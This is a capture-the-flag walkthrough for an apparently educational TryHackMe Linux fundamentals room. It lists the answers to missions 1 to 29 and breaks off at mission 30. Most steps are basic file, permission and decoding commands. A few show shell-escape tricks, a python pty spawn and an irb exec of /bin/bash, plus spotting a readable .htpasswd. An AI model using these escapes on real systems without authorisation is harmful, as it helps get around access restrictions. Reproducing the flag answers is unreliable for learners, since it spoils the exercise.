# Linux Agency Walkthrough
### Link
- https://tryhackme.com/room/linuxagency
---
# Linux Fundamentals
---
# What is the mission1 flag?

After SSH the targeted machine, you have inside the banner the mission1 flag
```
agent47@10.10.218.253's password:
Welcome to Ubuntu 18.04 LTS (GNU/Linux 4.15.0-20-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage


 * Canonical Livepatch is available for installation.
   - Reduce system reboots and improve kernel security. Activate at:
     https://ubuntu.com/livepatch

0 packages can be updated.
0 updates are security updates.

mission1{174dc8f191bcbb161fe25f8a5b58d1f0}
```
# Answer : mission1{174dc8f191bcbb161fe25f8a5b58d1f0}

# What is the mission2 flag?

Log as **mission1** user and use the previous flag as password.
Navigate to **mission2** directory and you find the next flag.


```
mission1@linuxagency:/home/agent47$ cd ..
mission1@linuxagency:/home$ cd mission1
mission1@linuxagency:~$ ls -l
total 0
-r-------- 1 mission1 mission1 0 Jan 12  2021 mission2{8a1b68bb11e4a35245061656b5b9fa0d}
```

# Answer: mission2{8a1b68bb11e4a35245061656b5b9fa0d}

# What is the mission3 flag?

Log as **mission2** user and use the previous flag as password.

Navigate inside **mission2** directory and check the **flag.txt** content
```
mission2@linuxagency:/home/mission1$ cd ..
mission2@linuxagency:/home$ cd mission2
mission2@linuxagency:~$ ls -l
total 4
-r-------- 1 mission2 mission2 43 Jan 12  2021 flag.txt
mission2@linuxagency:~$ cat flag.txt
mission3{ab1e1ae5cba688340825103f70b0f976}
```
# Answer: mission3{ab1e1ae5cba688340825103f70b0f976}

# What is the mission4 flag?

Same as previous task and when we check the **flag.txt**, we have this message:
```
mission3@linuxagency:/home/mission2$ cd ..
mission3@linuxagency:/home$ cd mission3
mission3@linuxagency:~$ ls -l
total 4
-r-------- 1 mission3 mission3 101 Jan 12  2021 flag.txt
mission3@linuxagency:~$ cat flag.txt
I am really sorry man the flag is stolen by some thief's.
```
Let's try to open the **flag.txt** with **vi**
``` 
mission4{264a7eeb920f80b3ee9665fafb7ff92d}^MI am really sorry man the flag is stolen by some thief's.
```
# Answer: mission4{264a7eeb920f80b3ee9665fafb7ff92d}

# What is the mission5 flag?
```
mission4@linuxagency:/home$ cd mission4
mission4@linuxagency:~$ ls -l
total 4
drwxr-xr-x 2 mission4 mission4 4096 Jan 12  2021 flag
mission4@linuxagency:~$ cd flag/
mission4@linuxagency:~/flag$ ls -l
total 4
-r-------- 1 mission4 mission4 43 Jan 12  2021 flag.txt
mission4@linuxagency:~/flag$ cat flag.txt
mission5{bc67906710c3a376bcc7bd25978f62c0}
```
# Answer: mission5{bc67906710c3a376bcc7bd25978f62c0}

# What is the mission6 flag?
As usual, navigate inside **mission5** home directory and you noticed : 0 files

Let's check a little more deeper by using the option **ls -la** where **a** means 
```
 -a      Include directory entries whose names begin with a dot (‘.’).
```

We can see the flag now ^^

```
mission5@linuxagency:~$ pwd
/home/mission5
mission5@linuxagency:~$ ls -la
total 20
drwxr-x---  2 mission5 mission5 4096 Jan 12  2021 .
drwxr-xr-x 45 root     root     4096 Jan 12  2021 ..
lrwxrwxrwx  1 mission5 mission5    9 Jan 12  2021 .bash_history -> /dev/null
-rw-r--r--  1 mission5 mission5 3771 Jan 12  2021 .bashrc
-r--------  1 mission5 mission5   43 Jan 12  2021 .flag.txt
-rw-r--r--  1 mission5 mission5  807 Jan 12  2021 .profile
mission5@linuxagency:~$ cat .flag.txt
mission6{1fa67e1adc244b5c6ea711f0c9675fde}
```

# Answer: mission6{1fa67e1adc244b5c6ea711f0c9675fde}

# What is the mission7 flag?
Same as the previous flag, we cannot find files. So let's use the same pattern by using **-a**

We are able to see the folder **.flag**. We just need to check if we have the flag inside and do a **cat**
```
mission6@linuxagency:/home$ cd mission6
mission6@linuxagency:~$ ls -l
total 0
mission6@linuxagency:~$ ls -la
total 20
drwxr-x---  3 mission6 mission6 4096 Jan 12  2021 .
drwxr-xr-x 45 root     root     4096 Jan 12  2021 ..
lrwxrwxrwx  1 mission6 mission6    9 Jan 12  2021 .bash_history -> /dev/null
-rw-r--r--  1 mission6 mission6 3771 Jan 12  2021 .bashrc
drwxr-xr-x  2 mission6 mission6 4096 Jan 12  2021 .flag
-rw-r--r--  1 mission6 mission6  807 Jan 12  2021 .profile
mission6@linuxagency:~$ cd ./flag
bash: cd: ./flag: No such file or directory
mission6@linuxagency:~$ ls -la ./.flag
total 12
drwxr-xr-x 2 mission6 mission6 4096 Jan 12  2021 .
drwxr-x--- 3 mission6 mission6 4096 Jan 12  2021 ..
-r-------- 1 mission6 mission6   43 Jan 12  2021 flag.txt
mission6@linuxagency:~$ cat ./.flag/flag.txt
mission7{53fd6b2bad6e85519c7403267225def5}
```

# Answer: mission7{53fd6b2bad6e85519c7403267225def5} 

# What is the mission8 flag?

This time, you have a **permission denied** but if you try to directly **cat** the file, it works ^^

```
mission6@linuxagency:~$ su mission7
Password:
bash: /home/mission6/.bashrc: Permission denied
mission7@linuxagency:~$ pwd
/home/mission6
mission7@linuxagency:~$ ls -la
ls: cannot open directory '.': Permission denied
mission7@linuxagency:~$ ls -la /home/mission7/
total 20
drwxr-x---  2 mission7 mission7 4096 Jan 12  2021 .
drwxr-xr-x 45 root     root     4096 Jan 12  2021 ..
lrwxrwxrwx  1 mission7 mission7    9 Jan 12  2021 .bash_history -> /dev/null
-rw-r--r--  1 mission7 mission7 3771 Jan 12  2021 .bashrc
-rw-r--r--  1 mission7 mission7  807 Jan 12  2021 .profile
-r--------  1 mission7 mission7   43 Jan 12  2021 flag.txt
mission7@linuxagency:~$ cat /home/mission7/flag.txt
mission8{3bee25ebda7fe7dc0a9d2f481d10577b}
```

# Answer: mission8{3bee25ebda7fe7dc0a9d2f481d10577b}

# What is the mission9 flag?

For this challenge, I checked the **hint** providede by the author of this room
```
Time to meet your great grandparents.
```

That means we must navigate to **/** and we can see the **flag**.

```
mission8@linuxagency:~$ pwd
/home/mission8
mission8@linuxagency:~$ cd ../..
mission8@linuxagency:/$ ls -l
total 483912
drwxr-xr-x   2 root     root          4096 Jan 12  2021 bin
drwxr-xr-x   3 root     root          4096 Jan 12  2021 boot
drwxrwxr-x   2 root     root          4096 Jan 12  2021 cdrom
drwxr-xr-x  17 root     root          3680 Nov 30 22:14 dev
drwxr-xr-x 126 root     root         12288 Feb  1  2021 etc
-r--------   1 mission8 mission8        43 Jan 12  2021 flag.txt
drwxr-xr-x  45 root     root          4096 Jan 12  2021 home
lrwxrwxrwx   1 root     root            33 Jan 12  2021 initrd.img -> boot/initrd.img-4.15.0-20-generic
lrwxrwxrwx   1 root     root            33 Jan 12  2021 initrd.img.old -> boot/initrd.img-4.15.0-20-generic
drwxr-xr-x  22 root     root          4096 Jan 12  2021 lib
drwxr-xr-x   2 root     root          4096 Apr 26  2018 lib64
drwx------   2 root     root         16384 Jan 12  2021 lost+found
drwxr-xr-x   3 root     root          4096 Apr 26  2018 media
drwxr-xr-x   2 root     root          4096 Apr 26  2018 mnt
drwxr-xr-x   4 root     root          4096 Jan 12  2021 opt
dr-xr-xr-x 127 root     root             0 Nov 30 22:14 proc
drwx------   5 root     root          4096 Feb  1  2021 root
drwxr-xr-x  27 root     root           880 Nov 30 22:24 run
drwxr-xr-x   2 root     root         12288 Jan 12  2021 sbin
drwxr-xr-x   9 root     root          4096 Jan 12  2021 snap
drwxr-xr-x   2 root     root          4096 Apr 26  2018 srv
-rw-------   1 root     root     495416320 Jan 12  2021 swapfile
dr-xr-xr-x  13 root     root             0 Nov 30 22:14 sys
drwxrwxrwt  10 root     root          4096 Nov 30 22:56 tmp
drwxr-xr-x  10 root     root          4096 Apr 26  2018 usr
drwxr-xr-x  15 root     root          4096 Jan 12  2021 var
lrwxrwxrwx   1 root     root            30 Jan 12  2021 vmlinuz -> boot/vmlinuz-4.15.0-20-generic
```
```
mission8@linuxagency:/$ cat flag.txt
mission9{ba1069363d182e1c114bef7521c898f5}
```

# Answer: mission9{ba1069363d182e1c114bef7521c898f5}

# What is the mission10 flag?

We have a file **rockyou.txt**. This file is too huge to just open it and try to find the flag. Let's use **grep** because we know the flag looks like **mission10{**

```
mission9@linuxagency:/$ cd /home/mission9
mission9@linuxagency:~$ ls -l
total 136648
-r-------- 1 mission9 mission9 139921551 Jan 12  2021 rockyou.txt
```

```
mission9@linuxagency:~$ cat rockyou.txt | grep mission10{
mission10{0c9d1c7c5683a1a29b05bb67856524b6}
```

# Answer : mission10{0c9d1c7c5683a1a29b05bb67856524b6}

# What is the mission11 flag?

When we check the **folder** content, we have some additional folders
```
mission10@linuxagency:~/folder$ ls -la
total 48
drwxr-xr-x 12 mission10 mission10 4096 Jan 12  2021 .
drwxr-x---  4 mission10 mission10 4096 Jan 12  2021 ..
drwxr-xr-x  2 mission10 mission10 4096 Jan 12  2021 L4D1
drwxr-xr-x 12 mission10 mission10 4096 Jan 12  2021 L4D10
drwxr-xr-x  2 mission10 mission10 4096 Jan 12  2021 L4D2
drwxr-xr-x 12 mission10 mission10 4096 Jan 12  2021 L4D3
drwxr-xr-x 12 mission10 mission10 4096 Jan 12  2021 L4D4
drwxr-xr-x 12 mission10 mission10 4096 Jan 12  2021 L4D5
drwxr-xr-x 12 mission10 mission10 4096 Jan 12  2021 L4D6
drwxr-xr-x 12 mission10 mission10 4096 Jan 12  2021 L4D7
drwxr-xr-x 12 mission10 mission10 4096 Jan 12  2021 L4D8
drwxr-xr-x 12 mission10 mission10 4096 Jan 12  2021 L4D9
```
For this challenge, I checked the **hint** providede by the author of this room
```
Your need to finD some way to reverse a binary tree.
```

Let's check **grep** option related to reverse
```
-R, -r, --recursive
Recursively search subdirectories listed.  (i.e., force grep to behave as rgrep).
```

So let's try to use this option:

```
mission10@linuxagency:~/folder$ grep -R mission11
L4D8/L3D7/L2D2/L1D10/flag.txt:mission11{db074d9b68f06246944b991d433180c0}
```

# Answer: mission11{db074d9b68f06246944b991d433180c0}

# What is the mission12 flag?

**hint**
```
Maybe it is time to study some EVs.
```

Let's check the **Environment Variable**
```
mission11@linuxagency:~$ env | grep mission
USER=mission11
PWD=/home/mission11
HOME=/home/mission11
MAIL=/var/mail/mission11
FLAG=mission12{f449a1d33d6edc327354635967f9a720}
flag=mission12{f449a1d33d6edc327354635967f9a720}
LOGNAME=mission11
```

# Answer : mission12{f449a1d33d6edc327354635967f9a720}

# What is the mission13 flag?

We find the **flag/txt** but we cannot open it and when we check the access rights, surprise : No access rights have been defined
```
mission12@linuxagency:~$ ls -la
total 20
drwxr-x---  2 mission12 mission12 4096 Jan 12  2021 .
drwxr-xr-x 45 root      root      4096 Jan 12  2021 ..
lrwxrwxrwx  1 mission12 mission12    9 Jan 12  2021 .bash_history -> /dev/null
-rw-r--r--  1 mission12 mission12 3771 Jan 12  2021 .bashrc
-rw-r--r--  1 mission12 mission12  807 Jan 12  2021 .profile
----------  1 mission12 mission12   44 Jan 12  2021 flag.txt
```
We can define the access with the current user because this user is the woner of the file
```
mission12@linuxagency:~$ chmod 700 flag.txt
mission12@linuxagency:~$ ls -la
total 20
drwxr-x---  2 mission12 mission12 4096 Jan 12  2021 .
drwxr-xr-x 45 root      root      4096 Jan 12  2021 ..
lrwxrwxrwx  1 mission12 mission12    9 Jan 12  2021 .bash_history -> /dev/null
-rw-r--r--  1 mission12 mission12 3771 Jan 12  2021 .bashrc
-rw-r--r--  1 mission12 mission12  807 Jan 12  2021 .profile
-rwx------  1 mission12 mission12   44 Jan 12  2021 flag.txt
mission12@linuxagency:~$ cat flag.txt
mission13{076124e360406b4c98ecefddd13ddb1f}
```

# Answer : mission13{076124e360406b4c98ecefddd13ddb1f}

# What is the mission14 flag?

When we check the content of the **flag.txt**, we have the flag but encrypted. I used [CyberChef](https://gchq.github.io/CyberChef) and I found the flag

```
mission13@linuxagency:/home/mission12$ cd /home/mission13
mission13@linuxagency:~$ ls -la
total 28
drwxr-x---  3 mission13 mission13 4096 Jan 12  2021 .
drwxr-xr-x 45 root      root      4096 Jan 12  2021 ..
lrwxrwxrwx  1 mission13 mission13    9 Jan 12  2021 .bash_history -> /dev/null
-rw-r--r--  1 mission13 mission13 3771 Jan 12  2021 .bashrc
drwxr-xr-x  3 mission13 mission13 4096 Jan 12  2021 .local
-rw-r--r--  1 mission13 mission13  807 Jan 12  2021 .profile
-rw-------  1 mission13 mission13  978 Jan 12  2021 .viminfo
-r--------  1 mission13 mission13   61 Jan 12  2021 flag.txt
mission13@linuxagency:~$ cat flag.txt
bWlzc2lvbjE0e2Q1OThkZTk1NjM5NTE0Yjk5NDE1MDc2MTdiOWU1NGQyfQo=
```

From CyberChef --> mission14{d598de95639514b9941507617b9e54d2}

# Answer : mission14{d598de95639514b9941507617b9e54d2}

# What is the mission15 flag?

Same as the previous mission, please use [CyberChef](https://gchq.github.io/CyberChef)

```
mission14@linuxagency:/home/mission13$ cd /home/mission14
mission14@linuxagency:~$ ls -la
total 20
drwxr-x---  2 mission14 mission14 4096 Jan 12  2021 .
drwxr-xr-x 45 root      root      4096 Jan 12  2021 ..
lrwxrwxrwx  1 mission14 mission14    9 Jan 12  2021 .bash_history -> /dev/null
-rw-r--r--  1 mission14 mission14 3771 Jan 12  2021 .bashrc
-rw-r--r--  1 mission14 mission14  807 Jan 12  2021 .profile
-r--------  1 mission14 mission14  345 Jan 12  2021 flag.txt
mission14@linuxagency:~$ cat flag.txt
01101101011010010111001101110011011010010110111101101110001100010011010101111011011001100110001100110100001110010011000100110101011001000011100000110001001110000110001001100110011000010110010101100110011001100011000000110001001100010011100000110101011000110011001100110101001101000011011101100110001100100011010100110101001110010011011001111101
```
# Answer : mission15{fc4915d818bfaeff01185c3547f25596}

# What is the mission16 flag?

Same as the previous mission, please use [CyberChef](https://gchq.github.io/CyberChef)

```
mission15@linuxagency:/home/mission14$ cd /home/mission15
mission15@linuxagency:~$ ls -la
total 20
drwxr-x---  2 mission15 mission15 4096 Jan 12  2021 .
drwxr-xr-x 45 root      root      4096 Jan 12  2021 ..
lrwxrwxrwx  1 mission15 mission15    9 Jan 12  2021 .bash_history -> /dev/null
-rw-r--r--  1 mission15 mission15 3771 Jan 12  2021 .bashrc
-rw-r--r--  1 mission15 mission15  807 Jan 12  2021 .profile
-r--------  1 mission15 mission15   87 Jan 12  2021 flag.txt
mission15@linuxagency:~$ cat flag.txt
6D697373696F6E31367B38383434313764343030333363346332303931623434643763323661393038657D
```

# Answer : mission16{884417d40033c4c2091b44d7c26a908e}

# What is the mission17 flag?

When we check the content of the **flag**,  it is a binary

- First : check the flag with **file**

```
mission16@linuxagency:~$ file flag
flag: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=1606102f7b80d832eabee1087180ea7ce24a96ca, not stripped
```

- Second : check the rights defined for this file

```
-r--------  1 mission16 mission16 8440 Jan 12  2021 flag
```
- Third : add **executable**. We can do that because mission16 is the owner of this file

```
mission16@linuxagency:~$ chmod +x flag
mission16@linuxagency:~$ ls -la
total 28
drwxr-x---  2 mission16 mission16 4096 Jan 12  2021 .
drwxr-xr-x 45 root      root      4096 Jan 12  2021 ..
lrwxrwxrwx  1 mission16 mission16    9 Jan 12  2021 .bash_history -> /dev/null
-rw-r--r--  1 mission16 mission16 3771 Jan 12  2021 .bashrc
-rw-r--r--  1 mission16 mission16  807 Jan 12  2021 .profile
-r-x--x--x  1 mission16 mission16 8440 Jan 12  2021 flag
```
- Fourth : Execute **flag**

```
mission16@linuxagency:~$ ./flag


mission17{49f8d1348a1053e221dfe7ff99f5cbf4}
```

# Answer : mission17{49f8d1348a1053e221dfe7ff99f5cbf4}


# What is the mission18 flag?

For this mnission, we have a **.java**

```
mission17@linuxagency:/home/mission16$ cd /home/mission17
mission17@linuxagency:~$ ls -la
total 20
drwxr-x---  2 mission17 mission17 4096 Jan 12  2021 .
drwxr-xr-x 45 root      root      4096 Jan 12  2021 ..
lrwxrwxrwx  1 mission17 mission17    9 Jan 12  2021 .bash_history -> /dev/null
-rw-r--r--  1 mission17 mission17 3771 Jan 12  2021 .bashrc
-rw-r--r--  1 mission17 mission17  807 Jan 12  2021 .profile
-rwxr-xr-x  1 mission17 mission17  475 Jan 12  2021 flag.java
```
I follow the instruction from [here](https://www.tutorialspoint.com/How-to-run-a-java-program)
Let's ompile the file and execute it.

```
mission17@linuxagency:~$ javac flag.java
mission17@linuxagency:~$ ls -la
total 24
drwxr-x---  2 mission17 mission17 4096 Nov 30 23:40 .
drwxr-xr-x 45 root      root      4096 Jan 12  2021 ..
lrwxrwxrwx  1 mission17 mission17    9 Jan 12  2021 .bash_history -> /dev/null
-rw-r--r--  1 mission17 mission17 3771 Jan 12  2021 .bashrc
-rw-r--r--  1 mission17 mission17  807 Jan 12  2021 .profile
-rw-rw-r--  1 mission17 mission17 1199 Nov 30 23:40 flag.class
-rwxr-xr-x  1 mission17 mission17  475 Jan 12  2021 flag.java
mission17@linuxagency:~$ java flag
mission18{f09760649986b489cda320ab5f7917e8}
```

# Answer : mission18{f09760649986b489cda320ab5f7917e8}

# What is the mission19 flag?

Now we have a **ruby** file. Let's run it.

```
mission18@linuxagency:/home/mission17$ cd /home/mission18
mission18@linuxagency:~$ ls -la
total 20
drwxr-x---  2 mission18 mission18 4096 Jan 12  2021 .
drwxr-xr-x 45 root      root      4096 Jan 12  2021 ..
lrwxrwxrwx  1 mission18 mission18    9 Jan 12  2021 .bash_history -> /dev/null
-rw-r--r--  1 mission18 mission18 3771 Jan 12  2021 .bashrc
-rw-r--r--  1 mission18 mission18  807 Jan 12  2021 .profile
-r--------  1 mission18 mission18  312 Jan 12  2021 flag.rb
mission18@linuxagency:~$ ruby flag.rb
mission19{a0bf41f56b3ac622d808f7a4385254b7}
```

# Answer : mission19{a0bf41f56b3ac622d808f7a4385254b7}

# What is the mission20 flag?

Now we have a C program. Let's compile and run it ^^

```
mission19@linuxagency:~$ gcc flag.c -o flag
flag.c: In function 'main':
flag.c:5:18: warning: implicit declaration of function 'strlen' [-Wimplicit-function-declaration]
     int length = strlen(flag);
                  ^~~~~~
flag.c:5:18: warning: incompatible implicit declaration of built-in function 'strlen'
flag.c:5:18: note: include '<string.h>' or provide a declaration of 'strlen'
mission19@linuxagency:~$ ls -l
total 28
-rwxrwxr-x 1 mission19 mission19 8432 Dec  1 18:10 flag
-r-------- 1 mission19 mission19  276 Jan 12  2021 flag.c
-rwxrwxr-x 1 mission19 mission19 8432 Dec  1 18:10 flag.txt
mission19@linuxagency:~$ ./flag
mission20{b0482f9e90c8ad2421bf4353cd8eae1c}

mission19@linuxagency:~$
```

# Answer : mission20{b0482f9e90c8ad2421bf4353cd8eae1c}

# What is the mission21 flag?

Now we hae a **python** program ^^

```
mission20@linuxagency:/home/mission19$ cd /home/mission20
mission20@linuxagency:~$ ls -l
total 4
-r-------- 1 mission20 mission20 186 Jan 12  2021 flag.py
mission20@linuxagency:~$ python flag.py
mission21{7de756aabc528b446f6eb38419318f0c}
```

# Answer : mission21{7de756aabc528b446f6eb38419318f0c}

# What is the mission22 flag?

For this mission, when we do a **ls -la**, we don't have anything related to **mission**. So we need to explore all hidden files. After few minutes, we found something interesting inside **.bashrc**

```
# Add an "alert" alias for long running commands.  Use like so:
echo "fWZhYTk0ZDI0YjQ4OTZlMmE2ZGU5ODgwYmU0N2FhYzQyezIybm9pc3NpbQo="|base64 -d|rev
```
Copy and execute this command line.

```
$ echo "fWZhYTk0ZDI0YjQ4OTZlMmE2ZGU5ODgwYmU0N2FhYzQyezIybm9pc3NpbQo="|base64 -d|rev
mission22{24caa74eb0889ed6a2e6984b42d49aaf}
```

# Answer : mission22{24caa74eb0889ed6a2e6984b42d49aaf}

# What is the mission23 flag?

We have access on Python interpreter. Not so ggod to launch command line.... Let's improve that by using that
```
import pty;pty.spawn(“/bin/bash”)
```
And now , we can work as usual ^^

```
mission22@linuxagency:/home/mission21$ cd /home/mission22
mission22@linuxagency:~$
mission22@linuxagency:~$ ls -la
total 24
drwxr-x---  2 mission22 mission22 4096 Jan 12  2021 .
drwxr-xr-x 45 root      root      4096 Jan 12  2021 ..
lrwxrwxrwx  1 mission22 mission22    9 Jan 12  2021 .bash_history -> /dev/null
-rw-r--r--  1 mission22 mission22 3771 Jan 12  2021 .bashrc
-rw-r--r--  1 mission22 mission22  807 Jan 12  2021 .profile
-rw-------  1 mission22 mission22  140 Jan 12  2021 .python_history
-r--------  1 mission22 mission22   44 Jan 12  2021 flag.txt
mission22@linuxagency:~$ cat flag.txt
mission23{3710b9cb185282e3f61d2fd8b1b4ffea}
```

# Answer : mission23{3710b9cb185282e3f61d2fd8b1b4ffea}

# What is the mission24 flag?

For this mission, we have a hint inside the **message.txt**. It seams we should perform a curl but what is the target.

```
mission23@linuxagency:/home/mission22$ cd /home/mission23
mission23@linuxagency:~$ ls -la
total 24
drwxr-x---  3 mission23 mission23 4096 Jan 15  2021 .
drwxr-xr-x 45 root      root      4096 Jan 12  2021 ..
lrwxrwxrwx  1 mission23 mission23    9 Jan 12  2021 .bash_history -> /dev/null
-rw-r--r--  1 mission23 mission23 3771 Jan 12  2021 .bashrc
drwxrwxr-x  3 mission23 mission23 4096 Jan 12  2021 .local
-rw-r--r--  1 mission23 mission23  807 Jan 12  2021 .profile
-r--------  1 mission23 mission23   69 Jan 15  2021 message.txt
mission23@linuxagency:~$ cat message.txt
The hosts will help you.
[OPTIONAL] Maybe you will need curly hairs.
```

Let's check **/etc/hosts** to see what entries have been added. We have **linuxagency**. Let's do **curl** with targeted **linuxagency**

```
mission23@linuxagency:~$ cat /etc/hosts
127.0.0.1	localhost	linuxagency	mission24.com
127.0.1.1	ubuntu	linuxagency

# The following lines are desirable for IPv6 capable hosts
::1     ip6-localhost ip6-loopback	linuxagency
fe00::0 ip6-localnet
ff00::0 ip6-mcastprefix
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
```

```
mission23@linuxagency:~$ curl linuxagency

<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
  <!--
    Modified from the Debian original for Ubuntu
    Last updated: 2016-11-16
    See: https://launchpad.net/bugs/1288690
  -->
  <head>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
    <title>mission24{dbaeb06591a7fd6230407df3a947b89c}</title>
    <style type="text/css" media="screen">
```

# Answer : mission24{dbaeb06591a7fd6230407df3a947b89c}

# What is the mission25 flag?

So we have an executable so let's try to run it and see what happens

```
mission24@linuxagency:~$ ./bribe


There is a guy who is smuggling flags
Bribe this guy to get the flag
Put some money in his pocket to get the flag

Words are not the price for your flag
Give Me money Man!!!
```

Not so easy to understand the message. Let's check the **hint** for this mission

```
Send the money to another country
```

We need to **trace** the money so we can try **ltrace** 

```
mission24@linuxagency:~$ ltrace ./bribe
getenv("pocket")                                                                                                  = nil
getenv("init")                                                                                                    = nil
puts("\n\nThere is a guy who is smugglin"...
```

We catch this information : **pocket** and **init** and one sentence from the nitial message **Put some money in his pocket to get the flag**.

This program tries to read these 2 variables from env. We can try to define **pocket=money** because the guy **wnats money**

```
Give Me money Man!!!
```

```
mission24@linuxagency:~$ export pocket=money
mission24@linuxagency:~$ ./bribe
Here ya go!!!
mission25{61b93637881c87c71f220033b22a921b}
Don't tell police about the deal man ;)
```

# Answer : mission25{61b93637881c87c71f220033b22a921b}


# What is the mission26 flag?

When we try basic command line, nothing happens. If we check the **PATH** variable, it is empty so let's just add **/bin:/usr/bin** in order to be able to perform basic command lines

```
mission25@linuxagency:~$ ls -latr
bash: ls: No such file or directory
mission25@linuxagency:~$ echo $PATH

mission25@linuxagency:~$ export PATH=/bin:/usr/bin
mission25@linuxagency:~$ ls -la
total 24
drwxr-x---  3 mission25 mission25 4096 Jan 12  2021 .
drwxr-xr-x 45 root      root      4096 Jan 12  2021 ..
lrwxrwxrwx  1 mission25 mission25    9 Jan 12  2021 .bash_history -> /dev/null
-rw-r--r--  1 mission25 mission25 3783 Jan 12  2021 .bashrc
drwxr-xr-x  3 mission25 mission25 4096 Jan 12  2021 .local
-rw-r--r--  1 mission25 mission25  807 Jan 12  2021 .profile
-rw-r--r--  1 mission25 mission25   44 Jan 12  2021 flag.txt
mission25@linuxagency:~$ cat flag.txt
mission26{cb6ce977c16c57f509e9f8462a120f00}
```

# Anser : mission26{cb6ce977c16c57f509e9f8462a120f00}


# What is the mission27 flag?

Now we have a **jpg** file. Let's analyze this file by using **file** command and we found the next password ^^

```
mission26@linuxagency:~$ ls -la
total 100
drwxr-x---  2 mission26 mission26  4096 Jan 12  2021 .
drwxr-xr-x 45 root      root       4096 Jan 12  2021 ..
lrwxrwxrwx  1 mission26 mission26     9 Jan 12  2021 .bash_history -> /dev/null
-rw-r--r--  1 mission26 mission26  3771 Jan 12  2021 .bashrc
-rw-r--r--  1 mission26 mission26   807 Jan 12  2021 .profile
-r--------  1 mission26 mission26 85980 Jan 12  2021 flag.jpg
mission26@linuxagency:~$ file flag.jpg
flag.jpg: JPEG image data, JFIF standard 1.01, resolution (DPI), density 100x100, segment length 16, comment: "mission27{444d29b932124a48e7dddc0595788f4d}", progressive, precision 8, 1000x1870, frames 3
```

# Answer : mission27{444d29b932124a48e7dddc0595788f4d}

# What is the mission28 flag?

We have a file with many **extensions** but the most important is the last **gz**. Let's **unzip** this file first.

```
mission27@linuxagency:~$ ls -la
total 20
drwxr-x---  2 mission27 mission27 4096 Jan 12  2021 .
drwxr-xr-x 45 root      root      4096 Jan 12  2021 ..
lrwxrwxrwx  1 mission27 mission27    9 Jan 12  2021 .bash_history -> /dev/null
-rw-r--r--  1 mission27 mission27 3771 Jan 12  2021 .bashrc
-rw-r--r--  1 mission27 mission27  807 Jan 12  2021 .profile
-rw-r--r--  1 mission27 mission27  136 Jan 12  2021 flag.mp3.mp4.exe.elf.tar.php.ipynb.py.rb.html.css.zip.gz.jpg.png.gz
mission27@linuxagency:~$ file flag.mp3.mp4.exe.elf.tar.php.ipynb.py.rb.html.css.zip.gz.jpg.png.gz
flag.mp3.mp4.exe.elf.tar.php.ipynb.py.rb.html.css.zip.gz.jpg.png.gz: gzip compressed data, was "flag.mp3.mp4.exe.elf.tar.php.ipynb.py.rb.html.css.zip.gz.jpg.png", last modified: Mon Jan 11 06:42:10 2021, from Unix
mission27@linuxagency:~$ gunzip flag.mp3.mp4.exe.elf.tar.php.ipynb.py.rb.html.css.zip.gz.jpg.png.gz
mission27@linuxagency:~$ ls -l
total 4
-rw-r--r-- 1 mission27 mission27 51 Jan 12  2021 flag.mp3.mp4.exe.elf.tar.php.ipynb.py.rb.html.css.zip.gz.jpg.png
```

Now, let's check the file by usin **file** and **strings**

```

mission27@linuxagency:~$ file flag.mp3.mp4.exe.elf.tar.php.ipynb.py.rb.html.css.zip.gz.jpg.png
flag.mp3.mp4.exe.elf.tar.php.ipynb.py.rb.html.css.zip.gz.jpg.png: GIF image data, version 87a, 27914 x 29545
mission27@linuxagency:~$ strings flag.mp3.mp4.exe.elf.tar.php.ipynb.py.rb.html.css.zip.gz.jpg.png
GIF87a
mission28{03556f8ca983ef4dc26d2055aef9770f}
```

# Answer : mission28{03556f8ca983ef4dc26d2055aef9770f}

# What is the mission29 flag?

Aftr logged in as **mission28** user, I have that :

```
mission27@linuxagency:~$ su mission28
Password:
irb(main):001:0>
```

It is **Ruby interactive**. More detail [here](https://docs.ruby-lang.org/en/2.2.0/IRB.html)

But it is not really convenient... Let's check [GTFOBINS](https://gtfobins.github.io/gtfobins/irb/). We have something interesting to easily switch to interactive shell

```
irb
exec '/bin/bash'
```

```
irb(main):001:0> exec '/bin/bash'
mission28@linuxagency:/home/mission27$ ls -la
ls: cannot open directory '.': Permission denied
mission28@linuxagency:/home/mission27$ cd /home/mission28
mission28@linuxagency:~$ ls -la
total 40
drwxr-x---  3 mission28 mission28 4096 Jan 12  2021 .
drwxr-xr-x 45 root      root      4096 Jan 12  2021 ..
lrwxrwxrwx  1 mission28 mission28    9 Jan 12  2021 .bash_history -> /dev/null
-rw-r--r--  1 mission28 mission28  220 Jan 12  2021 .bash_logout
-rw-r--r--  1 mission28 mission28 3771 Jan 12  2021 .bashrc
drwxr-xr-x  3 mission28 mission28 4096 Jan 12  2021 .local
-rw-r--r--  1 mission28 mission28  807 Jan 12  2021 .profile
-rw-r--r--  1 mission28 mission28 8980 Jan 12  2021 examples.desktop
-r--------  1 mission28 mission28   44 Jan 12  2021 txt.galf
mission28@linuxagency:~$ cat txt.galf
}1fff2ad47eb52e68523621b8d50b2918{92noissim
mission28@linuxagency:~$ cat txt.galf | rev
mission29{8192b05d8b12632586e25be74da2fff1}
```

# Answer : mission29{8192b05d8b12632586e25be74da2fff1}

# What is the mission30 flag?

We have access to an important file : **.htpasswd** ^^

```
mission29@linuxagency:~/bludit$ ls -la
total 44
drwxr-xr-x  7 mission29 mission29 4096 Jan 12  2021 .
drwxr-x---  3 mission29 mission29 4096 Jan 12  2021 ..
-rw-r--r--  1 mission29 mission29  394 Jan 12  2021 .htaccess
-rw-r--r--  1 mission29 mission29   44 Jan 12  2021 .htpasswd
-rw-r--r--  1 mission29 mission29 1083 Jan 12  2021 LICENSE
drwxr-xr-x  2 mission29 mission29 4096 Jan 12  2021 bl-content
drwxr-xr-x 10 mission29 mission29 4096 Jan 12  2021 bl-kernel
drwxr-xr-x  2 mission29 mission29 4096 Jan 12  2021 bl-languages
drwxr-xr-x 27 mission29 mission29 4096 Jan 12  2021 bl-plugins
drwxr-xr-x  4 mission29 mission29 4096 Jan 12  2021 bl-themes
-rw-r--r--  1 mission29 mission29  900 Jan 12  2021 index.php
